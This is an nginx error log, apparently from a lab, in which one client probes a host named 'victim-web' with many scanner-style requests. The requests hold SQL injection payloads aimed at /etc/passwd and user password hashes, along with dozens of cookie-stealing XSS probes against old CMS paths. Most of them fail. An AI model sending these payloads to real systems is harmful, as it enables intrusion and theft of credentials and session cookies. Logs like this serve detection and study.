2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /postnuke/html/My_eGallery/public/displayCategory.php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /modules/My_eGallery/public/displayCategory.php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /phpBB/My_eGallery/public/displayCategory.php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /forum/My_eGallery/public/displayCategory.php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /userinfo.php?uid=1; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 access forbidden by rule, client: 172.20.0.5, server: localhost, request: "GET /site/'%20UNION%20ALL%20SELECT%20FileToClob('/etc/passwd','server')::html,0%20FROM%20sysusers%20WHERE%20username=USER%20--/.html HTTP/1.1", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 access forbidden by rule, client: 172.20.0.5, server: localhost, request: "GET /site/'%20UNION%20ALL%20SELECT%20FileToClob('/etc/passwd','server')::html,0%20FROM%20sysusers%20WHERE%20username%20=%20USER%20--/.html HTTP/1.1", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month= HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /phpBB2/search.php?search_id=1\\ HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /horde/test.php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /imp/horde/test.php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /emailfriend/emailnews.php?id=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /emailfriend/emailfaq.php?id=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /administrator/upload.php?newbanner=1&choice=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /administrator/popups/sectionswindow.php?type=web&link=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /administrator/gallery/view.php?path=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /administrator/gallery/uploadimage.php?directory=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /administrator/gallery/navigation.php?directory=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /administrator/gallery/gallery.php?directory=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /upload.php?type=\"<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /soinfo.php?\"><script>alert('Vulnerable')</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825& HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /webamil/test.php HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27) HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /user.php?op=userinfo&uname=<script>alert('hi');</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /supporter/index.php?t=tickettime&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /supporter/index.php?t=ticketfiles&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /replymsg.php?send=1&destin=<script>alert('Vulnerable')</script> HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
2025/07/23 19:31:41 [error] 57#57: *5715 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.5, server: localhost, request: "GET /profiles.php?uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.4-fpm.sock:", host: "victim-web"
